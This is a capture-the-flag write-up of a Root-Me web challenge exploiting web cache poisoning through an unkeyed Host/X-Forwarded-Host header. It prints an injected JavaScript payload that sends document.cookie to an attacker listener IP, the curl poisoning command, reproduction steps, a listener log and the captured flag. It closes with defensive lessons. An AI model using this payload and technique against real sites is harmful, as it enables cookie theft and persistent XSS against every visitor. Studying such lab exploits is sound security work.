# Web Cache Poisoning — Unkeyed HTTP Header

**Platform**: Root-Me Pro · **Category**: Web · **Difficulty**: Easy · **Points**: 250
**Instance**: `instance-019fea4d-c372-72aa-ab50-7693c220dc5a.challenges.root-me.pro`

> Given the large number of people using your username personalization application, the system
> administrator recently implemented a cache system to reduce the load. When you mentioned he
> should be careful how he implements it, he replied that it's just a cache and there's nothing
> to worry about.

**Status: solved — flag captured.**

---

## Recon

Flask app (`Werkzeug/3.1.3 Python/3.11.14`) behind a cache that advertises itself clearly:

```
x-cache: hit | miss
cache-control: public, max-age=86400
```

Two routes:

| Route | Function |
|---|---|
| `/` | username personalization — `GET /?username=X` |
| `/report` | `POST path=...` → an admin bot visits the submitted path |

Submitting a username renders a results block containing a protocol-relative script tag whose
host is built from the request's `Host` header rather than being hardcoded:

```html
<script src="//10.250.0.10:40100/static/js/confettis_manager.js"></script>
```

## The vulnerability

**Unkeyed `Host` header + reflected value = stored cache poisoning.**

The cache key is path + `username` query value only — it does **not** include `Host`. The app
trusts and reflects `Host` into the `<script src>` origin, so an attacker can:

- Send one request to a given URL with a forged `Host` header.
- The cache stores that poisoned response under the URL's normal key.
- Every subsequent visitor to that URL — including ones sending a completely normal request — is
  served the poisoned HTML, which loads `confettis_manager.js` from the attacker's chosen host.

This escalates a header-reflection bug (usually low severity on its own) into **stored XSS against
every visitor of the page**, including a privileged admin bot.

## Exploit chain

0. Brought up the Root-Me Pro WireGuard tunnel (`sudo wg-quick up rootme`) to get a callback IP
   the challenge box can reach — here `172.29.7.32`. Targeted the **VPN endpoint**
   `http://10.250.0.10:40100`, not the public HTTPS URL (see Pitfalls).
1. Hosted a malicious `confettis_manager.js` on `172.29.7.32:8888`, exfiltrating via an
   **absolute** URL:
   ```js
   var C = "http://172.29.7.32:8888";
   new Image().src = C + "/x?cookie=" + encodeURIComponent(document.cookie);
   // plus a synchronous XHR to the same host as a backup
   ```
2. Poisoned the cache for a throwaway URL (`/?username=<random>`) with:
   ```bash
   curl "http://10.250.0.10:40100/?username=<random>" -H "X-Forwarded-Host: 172.29.7.32:8888"
   ```
3. Confirmed poisoning: a plain follow-up request (no header override) to the same URL returned
   `x-cache: hit` and still pointed the script tag at our host.
4. Reported that URL via `POST /report` (`path=/?username=<random>`) to make the admin bot visit it.
5. The bot rendered the poisoned page, ran our JS, and its `flag` cookie was exfiltrated to our
   listener.

Confirmed in `listener-solved.log`:

```
10.250.0.10 - - "GET /static/js/confettis_manager.js HTTP/1.1" 200 -
10.250.0.10 - - "GET /s?hello=js-executed HTTP/1.1" 404 -
10.250.0.10 - - "GET /s?cookie=flag%3DRM%7B7dd71a7a0b62263b31d0dc171fe048a6%7D HTTP/1.1" 404 -
```

The cookie was `flag=RM{...}` and **not** `HttpOnly`, so `document.cookie` was sufficient — the
same-origin re-read of `/` was belt-and-braces.

Reproduce end to end:

```bash
sudo wg-quick up rootme
mkdir -p www/static/js && cp confettis_manager.js www/static/js/
nohup python3 -m http.server 8888 --bind 172.29.7.32 --directory www > listener.log 2>&1 &
./exploit.py --target http://10.250.0.10:40100 --listener 172.29.7.32:8888
grep -oE 'RM(%7B|\{)[^}%]*(%7D|\})' listener.log
```

## Pitfalls that cost real time

Two silent failures made earlier runs look like "the bot fetches the JS but nothing comes back":

1. **Relative exfil URLs.** `new Image().src = "/x?..."` resolves against the **document** origin
   (the challenge app), not the script's origin. Every beacon was quietly hitting the target
   instead of the listener. Exfil URLs must be absolute.
2. **Mixed active content.** The public instance is HTTPS; a `//172.29.7.32:8888` script tag on an
   HTTPS page is mixed active content and the browser blocks it with no visible signal. The VPN
   endpoint is plain HTTP, so the poisoned tag loads fine.

Also worth knowing: username pages carry `max-age=30`, so a single poison request expires long
before the bot arrives — `exploit.py` re-poisons on a 5s timer for the whole window. And the flag
is **per-instance**, so a flag from an expired instance will not validate.

## Flag

```
RM{7dd71a7a0b62263b31d0dc171fe048a6}
```

## Lessons

- Any request header that influences a response body or headers must be part of the cache key, or
  it must not be trusted/reflected at all.
- `Host` (and its cousins `X-Forwarded-Host`, `X-Forwarded-Server`, etc.) is one of the most
  commonly forgotten "unkeyed" inputs because it's assumed to be trustworthy/static — but any HTTP
  client can set an arbitrary value.
- A caching layer turns a single reflected-header bug into a **persistent, self-propagating XSS**:
  one poisoned request affects every subsequent visitor until the TTL expires, no repeated
  exploitation needed.
- Output encoding on the *value* doesn't help when the attacker only needs to control the
  *origin* of a `<script src>` — escaping stops attribute breakout, not an origin swap.
- Probe unkeyed headers by poisoning with the header, then re-requesting **without** it; `x-cache:
  hit` plus your injected value still present is the proof.
- Without a routable callback IP (no VPN tunnel up), fall back to an in-scope oracle: point the
  poisoned script src at a unique path on the target itself and read cache state (`hit`/`miss`) as
  a signal channel. Getting the WireGuard tunnel (`sudo wg-quick up rootme`) up removed the need
  for that workaround entirely — a real listener + direct cookie exfil was simpler.
- **In injected JS, always use absolute exfil URLs.** A relative path resolves against the victim
  page's origin, not yours — the request goes to the target and you see nothing. This failure mode
  looks identical to "the payload never ran", which sends you debugging the wrong thing.
- **Check the scheme before picking a callback host.** HTTP callback + HTTPS victim page = silently
  blocked mixed content. When a challenge offers both a public HTTPS URL and a plain-HTTP VPN
  endpoint, the VPN endpoint is the one that makes http:// payload origins work.
- Fire a `hello` beacon as the payload's *first* statement. It separates "JS never executed" from
  "JS executed but exfil failed" — which is exactly the ambiguity the two bugs above create.
